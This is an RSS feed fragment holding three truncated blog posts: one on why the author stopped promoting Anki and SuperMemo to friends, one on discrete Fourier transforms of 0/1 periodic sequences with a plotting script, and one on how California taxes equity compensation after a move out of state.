<p>I’m probably over my head, but sometimes it feels like I’m personally attacked, that what I’m saying is not valuable. I understand it’s not true, but it took me years to study the learning science and to gain the experience with Anki/SuperMemo. The fact that they’re dismissing the software feels like they’re dismissing my knowledge and experience.</p>
<h2>The problems of giving advice on how to learn</h2>
<h3>#1. Nobody cares <em>that</em> much, alright?</h3>
<p>When I first discovered Anki I was like, “How come no one around me knows this?! I need to share this to everyone!” So I would tell my friends about Anki but nobody was interested. I’ve introduced Anki to people and every time it’s a very frustrating experience. (Surprise surprise, not SuperMemo. The learning curve of Anki is much lower. What chance do I have if I preached SuperMemo when they even think Anki is too hard to use?)</p>
<p>Update: I was never a missionary and randomly went out my way to tell people about Anki all the time like this:</p>
<p><span>
      <a href="https://www.masterhowtolearn.com/static/e160326dcc1a72ba87b79f26f888d457/737f1/thejenkinscomicVim.webp" target="_blank" rel="noopener">
    <span></span>
  <img alt="vim" title="vim" src="https://www.masterhowtolearn.com/static/e160326dcc1a72ba87b79f26f888d457/737f1/thejenkinscomicVim.webp" srcset="https://www.masterhowtolearn.com/static/e160326dcc1a72ba87b79f26f888d457/cbe2e/thejenkinscomicVim.webp 148w,
https://www.masterhowtolearn.com/static/e160326dcc1a72ba87b79f26f888d457/3084c/thejenkinscomicVim.webp 295w,
https://www.masterhowtolearn.com/static/e160326dcc1a72ba87b79f26f888d457/737f1/thejenkinscomicVim.webp 585w" sizes="(max-width: 585px) 100vw, 585px" loading="lazy">
  </a>
    </span></p>
<p><a href="https://thejenkinscomic.wordpress.com/">Source</a></p>
<p>Very early on I did give unsolicited advice once to my best friend by intentionally bringing up Anki. Then I did bring up Anki on multiple occasions, but only when the opportunity presented itself, like the story above.</p>
<p>People may be interested in how you’ve developed a skill or become fluent in a foreign language, but just not <strong>that</strong> interested. And they certainly don’t expect to be suddenly lectured on how learning and memory work.</p>
<p>I never liked following up to people with questions like “So how’s Anki? Have you used it?” It feels like pushing an agenda to them. Also, since most would not even bother buying and downloading the app, their response is usually, “I forgot about it. I’ll do it later.” and the conversation would end in an awkward tone.</p>
<h3>#2. I’m not sure if I actually want it, alright?</h3>
<p>Sometimes people keep lamenting “I want to learn X or I want to get better grades.” How many times do you hear people say they want to learn a second language? This is like that friend who keeps saying “I want to lose weight”. Probably after all, they’re just lamenting and not yet ready to put in the effort to change.</p>
<p>Trying to convince others to use Anki/SuperMemo is like trying to convince your friends to go to the gym regularly. You can talk about the benefits of exercising/weight-lifting, how good you’ll feel afterwards, how much more productive you’ll be and so on. But nothing will work if they don’t try it in the first place, and it doesn’t help that spaced repetition doesn’t work in the short-term since using Spaced Repetition Software is a life-long pursuit (just as learning is):</p>
<blockquote>
<p>This long term focus may explain why explicit spaced repetition is an uncommon studying technique: the pay-off is distant &amp; counterintuitive, the cost of self-control near &amp; vivid. <a href="https://www.gwern.net/Spaced-repetition">Gwern’s Spaced Repetition for Efficient Learning</a></p>
</blockquote>
<h3>#3. Why are you so hyped about it?</h3>
<p>It’s rare if people could understand and realize the significance and application of Spaced Repetition Software in a casual 10-min chat. It’s not about the complexity (it’s not rocket science after all), but rather it’s about awareness: problems with current learning approaches and how Anki/SuperMemo could solve the problems. In other words, if I don’t see the problems, why bother changing?</p>
<p>I have a friend who was learning German. She copied German vocabulary on one side and the equivalent English on the other in a notebook. I showed her my Korean Anki cards: “Take a look at these beautiful images! Gifs! Sentence cards! Audio clips! Mass Immersion Approach! (Former: All Japanese All The Time (AJATT)), Stephen Krashen’s Input Hypothesis!” Then I had another friend who was studying to become a nurse. I told him about Anki: “Image occlusion for anatomy!” It felt wrong of me to be hiding Anki (<a href="https://ankiweb.net/shared/info/1374772155">Image Occlusion</a> to be specific) from him. Deep down I want to shove their faces to this table:</p>
<p><span>
      <a href="https://www.masterhowtolearn.com/static/50f60f43bbd89353f63423035d211043/91608/UtilityAssessment.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="UtilityAssessment" title="UtilityAssessment" src="https://www.masterhowtolearn.com/static/50f60f43bbd89353f63423035d211043/fcda8/UtilityAssessment.png" srcset="https://www.masterhowtolearn.com/static/50f60f43bbd89353f63423035d211043/12f09/UtilityAssessment.png 148w,
https://www.masterhowtolearn.com/static/50f60f43bbd89353f63423035d211043/e4a3f/UtilityAssessment.png 295w,
https://www.masterhowtolearn.com/static/50f60f43bbd89353f63423035d211043/fcda8/UtilityAssessment.png 590w,
https://www.masterhowtolearn.com/static/50f60f43bbd89353f63423035d211043/efc66/UtilityAssessment.png 885w,
https://www.masterhowtolearn.com/static/50f60f43bbd89353f63423035d211043/c83ae/UtilityAssessment.png 1180w,
https://www.masterhowtolearn.com/static/50f60f43bbd89353f63423035d211043/91608/UtilityAssessment.png 1251w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
  </a>
    </span></p>
<p>(Image source: <a href="https://journals.sagepub.com/stoken/rbtfl/Z10jaVH/60XQM/full">Improving Students’ Learning With Effective Learning Techniques</a>)</p>
<p>I was exaggerating but you get the point: it’s not possible to convey the significance and application of it all in a casual 10-min chat. With the benefit of hindsight, all my attempts could’ve been a lot better:</p>
<ul>
<li>Maybe I was so convinced and have so much faith in Spaced Repetition Software that I came off as condescending, giving off the impression like “you don’t know how to study; let me teach you.”</li>
<li>Maybe it’s the bold claims: “You’ll get 2x results with half the study time.” (How many are really true whenever you hear such claim?)</li>
<li>Maybe it’s the situation: all he or she wants is someone to listen about the difficulty of studying, not some real advice or suggestions.</li>
</ul>
<p>Here’s the guy from <a href="http://brianjx.altervista.org/">How I Passed the Demanding […] Italian Language Exam Without Going to Italy – Here’s a Hint: the 326,538 Flashcard Reviews Helped a Lot.</a></p>
<blockquote>
<p>Like many language teachers, V. had never heard of Anki (but she did know Reverso Context). I showed her how I …</p></blockquote></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.masterhowtolearn.com/2020-10-31-why-i-no-longer-tell-my-friends-about-anki-supermemo/">https://www.masterhowtolearn.com/2020-10-31-why-i-no-longer-tell-my-friends-about-anki-supermemo/</a></em></p>]]>
            </description>
            <link>https://www.masterhowtolearn.com/2020-10-31-why-i-no-longer-tell-my-friends-about-anki-supermemo/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24957617</guid>
            <pubDate>Sun, 01 Nov 2020 06:33:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Discrete Fourier Transform for 0/1 Periodic Sequences]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24957393">thread link</a>) | @keyboardman
<br/>
October 31, 2020 | https://leimao.github.io/blog/Discrete-Fourier-Transform-Periodic-Zero-One-Sequence/ | <a href="https://web.archive.org/web/*/https://leimao.github.io/blog/Discrete-Fourier-Transform-Periodic-Zero-One-Sequence/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <h3 id="introduction">Introduction</h3>

<p>I am busy preparing a blog post for quantum Shor’s factorization algorithm. Shor’s algorithm is complicated if the reader would like to understand all of its mathematics from scratch. I have created several building-block posts toward Shor’s algorithm, including <a href="https://leimao.github.io/blog/Discrete-Fourier-Transform/">“Discrete Fourier Transform”</a>, <a href="https://leimao.github.io/blog/Euclidean-Algorithm/">“Euclidean Algorithm”</a>, and <a href="https://leimao.github.io/blog/Composite-Number-Factorization/">“Composite Number Factorization Using Modular Exponentiation Period”</a>. Each of them is self-contained and is a must to fully understand Shor’s algorithm mathematically.</p>



<p>In this blog post, I would like to finish the last building-block post toward Shor’s algorithm which is an interesting mathematical property of the application of discrete Fourier transform on $0/1$ periodic sequences.</p>

<h3 id="discrete-fourier-transform-for-01-periodic-sequences">Discrete Fourier Transform for 0/1 Periodic Sequences</h3>

<h4 id="01-periodic-sequences">0/1 Periodic Sequences</h4>

<p>The $0/1$ periodic sequence is a periodic sequence in which for each period all the values are $0$ except for one value is $1$. For example, $\{0,0,1,0,0,0,1,0,0,0,1,0\}$ is such kind of periodic sequence whose unique subsequence is $\{0,0,1,0\}$. $\{0,0,1,0\}$, $\{1,0,0,0\}$, $\{0,0,0,1\}$ are also considered to be valid unique subsequences. The period of this sequence is $4$.</p>

<h4 id="discrete-fourier-transform-for-01-periodic-sequences-1">Discrete Fourier Transform for 0/1 Periodic Sequences</h4>

<p>To see the effect of discrete Fourier transform on $0/1$ periodic sequences, let’s take a look at some examples first. Here I have prepared four real valued $0/1$ periodic sequences, the length of each of them is $N = 2^8 = 256$.</p><p>

\[\begin{align}
f_1 &amp;= \{ \underbrace{ 0,0,1,0,0,0,1,0,\cdots,0,0,1,0}_{N = 2^8}\} \\
f_2 &amp;= \{ \underbrace{ 0,0,1,0,0,1,\cdots,0,0,1,0}_{N = 2^8} \} \\
F_1 &amp;= \{ \underbrace{ 0,0,1,0,0,0,1,0,\cdots,0,0,1,0}_{N = 2^8} \} \\
F_2 &amp;= \{ \underbrace{ 0,0,1,0,0,1,\cdots,0,0,1,0}_{N = 2^8} \} \\
\end{align}\]

</p><p>Actually they are two sequences since $f_1 = F_1$ and $f_2 = F_2$. I used different notations for same sequences because $f$ would be applied discrete Fourier transformation, whereas $F$ would be applied inverse discrete Fourier transformation. The unique subsequence for $f_1$ and $F_1$ is $\{0,0,1,0\}$, and the unique subsequence for $f_2$ and $F_2$ is $\{0,0,1\}$. Therefore, the period for $f_1$ and $F_1$ is $4$, and the period for $f_2$ and $F_2$ is $3$. Note that the period for $f_1$ and $F_1$ divides $N = 2^8$ whereas the period for $f_2$ and $F_2$ does not.</p>



<p>The sequence could also be complex-numbered. The magnitude $\rho$ of a complex number $a + b i$ is $\sqrt{a^2 + b^2}$. If the complex number is represented using polar coordinates $\rho e^{i\theta}$, the magnitude is just $\rho$ then. So the magnitude of the sequence is represented by $\rho_{f}$ or $\rho_{F}$.</p>



<p>We further define the “normalized probability” for a sequence. The concept of “probability” is less useful in this context, but it will become extremely useful when we discuss quantum computing and Shor’s factorization algorithm. The normalized probability for each element $f[i]$ in the sequence is defined as</p><p>

\[p_f[i] = \frac{\rho_{f}[i]^2}{\sum_{j=1}^{N}\rho_{f}[j]^2}\]

</p><p>or</p><p>

\[p_F[i] = \frac{\rho_{F}[i]^2}{\sum_{j=1}^{N}\rho_{F}[j]^2}\]

</p><p>If we apply discrete Fourier transform and inverse discrete Fourier transform to such sequence, let’s see what will happen. We will use a Python program for demonstration.</p>

<div><div><pre><code><span># dft_periodic_01.py
</span><span>import</span> <span>numpy</span> <span>as</span> <span>np</span>
<span>import</span> <span>matplotlib</span>
<span>matplotlib</span><span>.</span><span>use</span><span>(</span><span>'Agg'</span><span>)</span>
<span>import</span> <span>matplotlib.pyplot</span> <span>as</span> <span>plt</span>

<span>def</span> <span>plot_probabilities</span><span>(</span><span>f_N</span><span>,</span> <span>F_N</span><span>,</span> <span>title</span><span>,</span> <span>filename</span><span>):</span>

    <span>N</span> <span>=</span> <span>len</span><span>(</span><span>f_N</span><span>)</span>
    <span>assert</span> <span>N</span> <span>==</span> <span>len</span><span>(</span><span>F_N</span><span>)</span>

    <span>f_N_magnitude</span> <span>=</span> <span>np</span><span>.</span><span>absolute</span><span>(</span><span>f_N</span><span>)</span>
    <span>f_N_probability</span> <span>=</span> <span>f_N_magnitude</span> <span>**</span> <span>2</span> <span>/</span> <span>np</span><span>.</span><span>sum</span><span>(</span><span>f_N_magnitude</span> <span>**</span> <span>2</span><span>)</span>

    <span>F_N_magnitude</span> <span>=</span> <span>np</span><span>.</span><span>absolute</span><span>(</span><span>F_N</span><span>)</span>
    <span>F_N_probability</span> <span>=</span> <span>F_N_magnitude</span> <span>**</span> <span>2</span> <span>/</span> <span>np</span><span>.</span><span>sum</span><span>(</span><span>F_N_magnitude</span> <span>**</span> <span>2</span><span>)</span>

    <span>x</span> <span>=</span> <span>np</span><span>.</span><span>arange</span><span>(</span><span>N</span><span>)</span>
    <span>y1</span> <span>=</span> <span>f_N_probability</span>
    <span>y2</span> <span>=</span> <span>F_N_probability</span>
    <span>fig</span><span>,</span> <span>ax</span> <span>=</span> <span>plt</span><span>.</span><span>subplots</span><span>(</span><span>figsize</span><span>=</span><span>(</span><span>6</span><span>,</span><span>4</span><span>))</span>
    <span>ax</span><span>.</span><span>stem</span><span>(</span><span>x</span><span>,</span> <span>y1</span><span>,</span> <span>"b"</span><span>,</span> <span>markerfmt</span><span>=</span><span>"bo"</span><span>,</span> <span>label</span><span>=</span><span>"f(n)"</span><span>)</span>
    <span>ax</span><span>.</span><span>stem</span><span>(</span><span>x</span><span>,</span> <span>y2</span><span>,</span> <span>"g"</span><span>,</span> <span>markerfmt</span><span>=</span><span>"go"</span><span>,</span> <span>label</span><span>=</span><span>"F(n)"</span><span>)</span>
    <span>ax</span><span>.</span><span>legend</span><span>()</span>
    <span>ax</span><span>.</span><span>set_xlabel</span><span>(</span><span>"n"</span><span>)</span>
    <span>ax</span><span>.</span><span>set_ylabel</span><span>(</span><span>"p"</span><span>)</span>
    <span>ax</span><span>.</span><span>set_title</span><span>(</span><span>title</span><span>)</span>
    <span>fig</span><span>.</span><span>savefig</span><span>(</span><span>filename</span> <span>+</span> <span>".svg"</span><span>,</span> <span>format</span><span>=</span><span>"svg"</span><span>,</span> <span>dpi</span><span>=</span><span>600</span><span>,</span> <span>bbox_inches</span><span>=</span><span>"tight"</span><span>)</span>

<span>def</span> <span>dft</span><span>(</span><span>f_N</span><span>):</span>

    <span>F_N</span> <span>=</span> <span>np</span><span>.</span><span>fft</span><span>.</span><span>fft</span><span>(</span><span>f_N</span><span>)</span>
    <span>F_N_magnitude</span> <span>=</span> <span>np</span><span>.</span><span>absolute</span><span>(</span><span>F_N</span><span>)</span>
    <span>F_N_probability</span> <span>=</span> <span>F_N_magnitude</span> <span>**</span> <span>2</span> <span>/</span> <span>np</span><span>.</span><span>sum</span><span>(</span><span>F_N_magnitude</span> <span>**</span> <span>2</span><span>)</span>

    <span>return</span> <span>F_N</span><span>,</span> <span>F_N_magnitude</span><span>,</span> <span>F_N_probability</span>

<span>def</span> <span>idft</span><span>(</span><span>F_N</span><span>):</span>

    <span>f_N</span> <span>=</span> <span>np</span><span>.</span><span>fft</span><span>.</span><span>ifft</span><span>(</span><span>F_N</span><span>)</span>
    <span>f_N_magnitude</span> <span>=</span> <span>np</span><span>.</span><span>absolute</span><span>(</span><span>f_N</span><span>)</span>
    <span>f_N_probability</span> <span>=</span> <span>f_N_magnitude</span> <span>**</span> <span>2</span> <span>/</span> <span>np</span><span>.</span><span>sum</span><span>(</span><span>f_N_magnitude</span> <span>**</span> <span>2</span><span>)</span>

    <span>return</span> <span>f_N</span><span>,</span> <span>f_N_magnitude</span><span>,</span> <span>f_N_probability</span>

<span>def</span> <span>plot_dft_probabilities</span><span>(</span><span>f_N</span><span>,</span> <span>title</span><span>,</span> <span>filename</span><span>):</span>

    <span>F_N</span> <span>=</span> <span>np</span><span>.</span><span>fft</span><span>.</span><span>fft</span><span>(</span><span>f_N</span><span>)</span>
    <span>plot_probabilities</span><span>(</span><span>f_N</span><span>=</span><span>f_N</span><span>,</span> <span>F_N</span><span>=</span><span>F_N</span><span>,</span> <span>title</span><span>=</span><span>title</span><span>,</span> <span>filename</span><span>=</span><span>filename</span><span>)</span>

<span>def</span> <span>plot_inverse_dft_probabilities</span><span>(</span><span>F_N</span><span>,</span> <span>title</span><span>,</span> <span>filename</span><span>):</span>

    <span>f_N</span> <span>=</span> <span>np</span><span>.</span><span>fft</span><span>.</span><span>ifft</span><span>(</span><span>F_N</span><span>)</span>
    <span>plot_probabilities</span><span>(</span><span>f_N</span><span>=</span><span>f_N</span><span>,</span> <span>F_N</span><span>=</span><span>F_N</span><span>,</span> <span>title</span><span>=</span><span>title</span><span>,</span> <span>filename</span><span>=</span><span>filename</span><span>)</span>

<span>def</span> <span>generate_periodic_sequence</span><span>(</span><span>unique_sequence</span><span>,</span> <span>N</span><span>):</span>

    <span>unique_sequence</span> <span>=</span> <span>list</span><span>(</span><span>unique_sequence</span><span>)</span>
    <span>return</span> <span>(</span><span>unique_sequence</span> <span>*</span> <span>(</span><span>N</span> <span>//</span> <span>len</span><span>(</span><span>unique_sequence</span><span>)</span> <span>+</span> <span>1</span><span>))[:</span><span>N</span><span>]</span>

<span>def</span> <span>main</span><span>():</span>

    <span>n</span> <span>=</span> <span>8</span>
    <span>N</span> <span>=</span> <span>2</span> <span>**</span> <span>n</span>

    <span># Period divides sequence length
</span>    <span>unique_sequence_1</span> <span>=</span> <span>[</span><span>0</span><span>,</span><span>0</span><span>,</span><span>1</span><span>,</span><span>0</span><span>]</span>
    <span># Period does not divide sequence length
</span>    <span>unique_sequence_2</span> <span>=</span> <span>[</span><span>0</span><span>,</span><span>0</span><span>,</span><span>1</span><span>]</span>

    <span>f1_N</span> <span>=</span> <span>generate_periodic_sequence</span><span>(</span><span>unique_sequence</span><span>=</span><span>unique_sequence_1</span><span>,</span> <span>N</span><span>=</span><span>N</span><span>)</span>
    <span>f2_N</span> <span>=</span> <span>generate_periodic_sequence</span><span>(</span><span>unique_sequence</span><span>=</span><span>unique_sequence_2</span><span>,</span> <span>N</span><span>=</span><span>N</span><span>)</span>
    <span>plot_dft_probabilities</span><span>(</span><span>f_N</span><span>=</span><span>f1_N</span><span>,</span> <span>title</span><span>=</span><span>"f1 DFT"</span><span>,</span> <span>filename</span><span>=</span><span>"f1_dft"</span><span>)</span>
    <span>plot_dft_probabilities</span><span>(</span><span>f_N</span><span>=</span><span>f2_N</span><span>,</span> <span>title</span><span>=</span><span>"f2 DFT"</span><span>,</span> <span>filename</span><span>=</span><span>"f2_dft"</span><span>)</span>

    <span>F1_N</span> <span>=</span> <span>generate_periodic_sequence</span><span>(</span><span>unique_sequence</span><span>=</span><span>unique_sequence_1</span><span>,</span> <span>N</span><span>=</span><span>N</span><span>)</span>
    <span>F2_N</span> <span>=</span> <span>generate_periodic_sequence</span><span>(</span><span>unique_sequence</span><span>=</span><span>unique_sequence_2</span><span>,</span> <span>N</span><span>=</span><span>N</span><span>)</span>
    <span>plot_inverse_dft_probabilities</span><span>(</span><span>F_N</span><span>=</span><span>F1_N</span><span>,</span> <span>title</span><span>=</span><span>"F1 iDFT"</span><span>,</span> <span>filename</span><span>=</span><span>"F1_idft"</span><span>)</span>
    <span>plot_inverse_dft_probabilities</span><span>(</span><span>F_N</span><span>=</span><span>F2_N</span><span>,</span> <span>title</span><span>=</span><span>"F2 iDFT"</span><span>,</span> <span>filename</span><span>=</span><span>"F2_idft"</span><span>)</span>

<span>if</span> <span>__name__</span> <span>==</span> <span>"__main__"</span><span>:</span>
    
    <span>main</span><span>()</span>
</code></pre></div></div>

<p>In fact, the magnitude of the output sequences from discrete Fourier transform and inverse discrete Fourier transform are also perfect $0/1$ periodic sequences for $f_1$ and $F_1$ and almost $0/1$ periodic sequences for $f_2$ and $F_2$. Suppose the period of $0/1$ periodic sequences before discrete Fourier transform or inverse discrete Transform is $r$, then the period of the output sequences is exactly $\frac{N}{r}$ for sequences whose period $r$ divides $N$, such as $f_1$ and $F_1$, and around $\frac{N}{r}$ for sequences whose period $r$ does divide $N$, such as $f_2$ and $F_2$.</p>



<p>The period of $f_1$ is $4$, the period of $f_2$ is $3$, and $N = 2^8 = 256$. We found the period of the magnitude or probability of the output sequence from discrete Fourier transform is $64$ for $f_1$ and $85$ for $f_2$. Note that $64 = \frac{256}{4}$ and $85 \approx \frac{256}{3}$.</p>



<p>The same effect also holds for inverse discrete Fourier transform.</p>



<p>Therefore, formally, suppose the input $0/1$ periodic sequence has period $r$ and length $N$, after discrete Fourier transform or inverse discrete Fourier transform, the normalized probabilities of the output sequence will have period $r^{\prime}$ exactly equal to $\frac{N}{r}$ if $r$ divides $N$, or $r^{\prime}$ around $\frac{N}{r}$ if $r$ does not divide $N$. The highest normalized probabilities will occur at positions $k \frac{N}{r}$ where $k = 0, 1, \cdots, r-1$. The normalized probabilities for all the rest of the positions will be $0$ if $r$ divides $N$ or almost $0$ if $r$ does not divide $N$.</p>

<h4 id="mathematical-proof">Mathematical Proof</h4>

<p>To explain this phenomenon mathematically, I would like to derive a proof for inverse discrete Fourier transform and the scenario where $r$ divides $N$. For the scenario where $r$ does not divide $N$, I would also try to explain intuitively with mathematics. For discrete Fourier transform, it could be proved using similar mathematical processes.</p>



<p><em>Proof</em></p>



<p>The inverse Fourier transform is mathematically defined as</p><p>

\[\begin{align}
f[n] &amp;= \frac{1}{N} \sum_{k = 0}^{N-1} F[k] e^{i \frac{2\pi k n}{N}} \\
\end{align}\]

</p><p>We defined offset $b$ as the distance between the beginning of the unique sequence and the position of $1$ in the unique sequence. Then we must have</p><p>

\[f[b] = f[b + kr]\]

</p><p>where $k$ is any non-negative integer, as long as $b + kr &lt; N$.</p>



<p>Assuming $r$ divides $N$, the inverse discrete Fourier transform for $0/1$ periodic sequence becomes</p><p>

\[\begin{align}
f[n] &amp;= \frac{1}{N} \sum_{k = 0}^{N-1} F[k] e^{i \frac{2\pi k n}{N}} \\
&amp;= \frac{1}{N} \bigg( \underbrace{ F[b] e^{i \frac{2\pi b n}{N}} + F[b + r] e^{i \frac{2\pi (b + r) n}{N}} + \cdots + F[b + (\frac{N}{r} - 1) r] e^{i \frac{2\pi (b + (\frac{N}{r} - 1) r) n}{N}} }_{\frac{N}{r}} \bigg) \\
&amp;= \frac{1}{N} \big( \underbrace{ F[b] e^{i \frac{2\pi b n}{N}} + F[b] e^{i \frac{2\pi (b + r) n}{N}} + \cdots + F[b] e^{i \frac{2\pi (b + (\frac{N}{r} - 1) r) n}{N}} }_{\frac{N}{r}} \big) \\
&amp;= \frac{1}{N} F[b] \big( \underbrace{ e^{i \frac{2\pi b n}{N}} + e^{i \frac{2\pi (b + r) n}{N}} + \cdots + e^{i \frac{2\pi (b + (\frac{N}{r} - 1) r) n}{N}} }_{\frac{N}{r}} \big) \\
&amp;= \frac{1}{N} F[b] e^{i \frac{2\pi b n}{N}} \big( \underbrace{ 1 + e^{i \frac{2\pi r n}{N}} + \cdots + e^{i \frac{2\pi (\frac{N}{r} - 1) r n}{N}} }_{\frac{N}{r}} \big) \\
\end{align}\]

</p><p>Note that $\{1, e^{i \frac{2\pi r n}{N}}, \cdots, e^{i \frac{2\pi (\frac{N}{r} - 1) r n}{N}} \}$ is a geometric sequence. We would have to compute the sum of the geometric sequence.</p><p>

\[\begin{align}
\underbrace{ 1 + e^{i \frac{2\pi r n}{N}} + \cdots + e^{i \frac{2\pi (\frac{N}{r} - 1) r n}{N}} }_{\frac{N}{r}} &amp;=
\begin{cases}
  \frac{N}{r} &amp; \text{if $e^{i \frac{2\pi r n}{N}} = 1$}\\
  \frac{1 - \big(e^{i \frac{2\pi r n}{N}}\big)^{\frac{N}{r}} }{1 - e^{i \frac{2\pi r n}{N}}} &amp; \text{else}\\
\end{cases} \\
&amp;= 
\begin{cases}
  \frac{N}{r} &amp; \text{if $e^{i \frac{2\pi r n}{N}} = 1$}\\
  \frac{1 - e^{i 2\pi n} }{1 - e^{i \frac{2\pi r n}{N}}} &amp; \text{else}\\
\end{cases} \\
&amp;= 
\begin{cases}
  \frac{N}{r} &amp; \text{if $e^{i \frac{2\pi r n}{N}} = 1$}\\
  \frac{1 - 1 }{1 - e^{i \frac{2\pi r n}{N}}} &amp; \text{else}\\
\end{cases} \\
&amp;= 
\begin{cases}
  …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://leimao.github.io/blog/Discrete-Fourier-Transform-Periodic-Zero-One-Sequence/">https://leimao.github.io/blog/Discrete-Fourier-Transform-Periodic-Zero-One-Sequence/</a></em></p>]]>
            </description>
            <link>https://leimao.github.io/blog/Discrete-Fourier-Transform-Periodic-Zero-One-Sequence/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24957393</guid>
            <pubDate>Sun, 01 Nov 2020 05:18:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Will You Owe CA Tax After You Leave?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24957321">thread link</a>) | @Xcelerate
<br/>
October 31, 2020 | https://www.upstartwealth.com/blog/will-you-owe-ca-tax-after-you-leave | <a href="https://web.archive.org/web/*/https://www.upstartwealth.com/blog/will-you-owe-ca-tax-after-you-leave">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>New work from home (WFH) policies might have you thinking about whether it’s worth it to stay in California or move to a state with a lower cost of living, lower real estate prices, and lower taxes. When thinking about what’s right for you and your family, there’s a lot to consider. Will there be cost-of-living salary adjustments? Will you be closer to or further from family? What do future job opportunities look like elsewhere? Is working from home a good long-term fit for you, or are you happier or more productive at the office?&nbsp;&nbsp;</p><p>But there’s one important consideration that may not be on your radar yet. How long will you have to keep paying taxes in California after you leave?&nbsp;</p><p>For tech employees with equity compensation, it’s usually not a clean break, even after establishing residency in a different state. In some cases, you might pay taxes in California for years after leaving.&nbsp;&nbsp;</p><p>The tax you pay depends on the type and timeline of your equity compensation. Where you live at <em>grant date</em>, <em>vest date</em>, <em>exercise date</em> (if any), and <em>sale date</em> is what matters. We’ll break it all down for you across each type of equity compensation, so you know when you’ll finally be done paying tax to California whether you’re a <strong>CA resident</strong> or a <strong>non-CA resident</strong>.</p><p>The tax you pay depends on the type and timeline of your equity compensation. Where you live at <em>grant date</em>, <em>vest date</em>, <em>exercise date</em> (if any), and <em>sale date</em> is what matters. We’ll break it all down for you across each type of equity compensation, so you know when you’ll finally be done paying tax to California.</p><ul role="list"><li>Restricted Stock Units (RSUs)</li><li>Non-Qualified Stock Options (NSOs)</li><li>Incentive Stock Options (ISOs)</li><li>Employee Stock Purchase Plans (ESPP)</li></ul><h3><strong>RSU Taxation</strong></h3><p>Let’s start with how taxes on Restricted Stock Units typically work. RSUs are generally taxable like salary when shares vest. The taxable income incurred on each vest is calculated as follows:</p><p><strong>RSU Wage Income</strong> = (# of shares vesting) x (share price on date of vest)</p><p>This is standard for the IRS, but what about from a state perspective? Because tax laws differ across states, it all depends on where you live on three key dates: when RSUs are granted, when RSUs vest, and when RSUs are sold.</p><p>If you are a <strong>CA resident</strong> when the stock was granted through when it vests, the entire value is taxable income in CA. But what if you leave California after grant but before vesting?</p><blockquote>EX: As a CA resident, your new job started on June 1, 2018, and you received a grant of 10,000 RSUs at a public company. Your RSUs have a 4-year vesting schedule with a 12-month cliff, and shares vest annually thereafter. On May 1, 2020 you moved to Austin, TX. How are the 2,500 RSUs that vest on June 1, 2020 taxed now that you are a resident of Texas?</blockquote><p>As a CA resident on the grant date but not the vesting date, California applies a “days worked” calculation to determine how much of the taxable income for RSUs vesting on June 1, 2020 is attributable to services performed while living in CA.&nbsp;</p><p>The calculation is called the Allocation Ratio, and it’s calculated by taking the total number of workdays you spent <em>in California</em> between grant date (6/1/18) and vest date (6/1/2020), and dividing it by the total number of workdays between 6/1/2018 and 6/1/2020.&nbsp;</p><p><strong>Allocation Ratio</strong> = (total workdays in CA between grant and vest) ÷ (total workdays between grant and vest)</p><p>To find your allocation ratio,<a href="https://www.timeanddate.com/date/workdays.html"> this online calculator</a> is a great place to start. Be sure to exclude vacation/holidays and weekends, and include the end date.</p><p>Once you know your Allocation Ratio, multiply your total RSU income from the 6/1/2020 vest date by your Allocation Ratio.&nbsp;</p><p><strong>CA Taxable Income</strong> = (Total RSU income from vest) x (Allocation Ratio)</p><p>And keep in mind that when your shares vest in 2021 and 2022, a portion will still be taxable in California.&nbsp;</p><p>If you have RSUs at a private company, the logic is the same as explained above, but the allocation ratio is determined by grant date and liquidity date (your ability to sell) rather than vest date.</p><figure><p><img src="https://uploads-ssl.webflow.com/5d60577d7a6c5d1ac084a849/5ee78cc02dbae84d9c56cc82_RSU%20Summary.PNG" alt=""></p></figure><h3><strong>NSO Taxation</strong></h3><p>Non-Qualified Stock Options are typically taxed at two key events. The first is when you exercise the right to purchase vested shares. The second time taxes are triggered is when you sell your shares.&nbsp;</p><p>So let’s focus on the first tax trigger. The amount that’s taxable when you exercise the right to purchase shares is the <em>spread</em>, which is the difference between the fair market value (FMV) of the stock on the date of exercise and the exercise price. Like salary, the <em>spread </em>&nbsp;is taxed as wage income.</p><p><strong>NSO Wage Income</strong> = (# of shares exercised) x (FMV - exercise price)&nbsp;</p><p>If you were a <strong>CA resident</strong> when the shares were granted and exercised, all income is attributable to work performed in CA, so the entire <em>spread</em> is taxable in CA.</p><p>However, if you were a <strong>CA resident </strong>at grant<strong> </strong>but a <strong>non-CA resident</strong> when you exercised, CA uses the “days worked” calculation to determine how much of the wage income is attributable to services performed while in CA.</p><blockquote>EX: As a CA resident, your new job started on June 1, 2018, and you received a grant of 10,000 NSOs at a $1 exercise price. Your NSOs have a 4-year vesting schedule with a 12-month cliff, and shares vest annually thereafter. On June 2, 2019 the FMV is $2 and you exercised the 2,500 NSOs that vest. On May 1, 2020 you move to Austin, TX. On June 1, 2020 another 2,500 NSOs vest and you exercise them on June 3, 2020 when the FMV is $3. Assuming no shares have been sold, what are the tax implications?&nbsp;</blockquote><p>Since you were a <strong>CA resident</strong> from grant date through the first exercise, 100% of the <em>spread </em>is attributable to services performed in CA for 2019 taxes.</p><p>2020 CA taxable income from NSO wages is determined by the Allocation Ratio for the number of days worked <em>in California</em> between grant date (6/1/2018) and exercise date (6/3/2020), and dividing the total number of workdays between those dates.</p><p><strong>CA Taxable Income </strong>= (NSO Wage Income) x (Allocation Ratio)</p><p>The allocation ratio for future exercises is determined by the date of exercise.</p><p>Now let’s address that second key time that taxes are triggered for NSOs. If you leave CA after exercise but before you sell your shares, any capital gain or loss on the sold stock as a <strong>non-CA resident </strong>is not considered CA income. However, if you re-establish residency in California prior to sale, CA will tax 100% of the capital gains proceeds.</p><figure><p><img 